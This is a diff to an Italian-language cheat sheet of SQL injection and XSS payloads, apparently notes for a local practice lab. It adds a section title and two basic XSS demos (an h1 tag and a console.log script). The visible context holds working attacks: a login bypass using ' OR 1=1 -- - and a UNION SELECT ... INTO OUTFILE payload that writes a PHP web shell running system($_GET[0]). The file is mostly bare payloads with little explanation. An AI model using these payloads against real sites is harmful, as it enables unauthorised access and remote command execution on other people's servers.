@@ -1,3 +1,5 @@
+SQL INJECTION
+
 1) Bypassare login
 
 username= ' OR 1=1 -- -
@@ -39,3 +41,16 @@ INTO OUTFILE /opt/lampp/htdocs/sqlinj/prova.txt' -- -
 8) Scrivere un file PHP che esegue codice da shell
 
 stringa casuale' UNION SELECT "", '<?php system($_GET[0]); ?>', "", "" INTO OUTFILE '/opt/lampp/htdocs/sqlinj/shell.php' -- - 
+
+
+
+XSS INJECTION
+
+1) Inject html come h1
+
+<h1>prova</h1>
+
+
+2) Aggiungere script js (console.log serve per scrivere sulla console CTRL + ALT + I)
+
+<script>console.log("prova")</script>
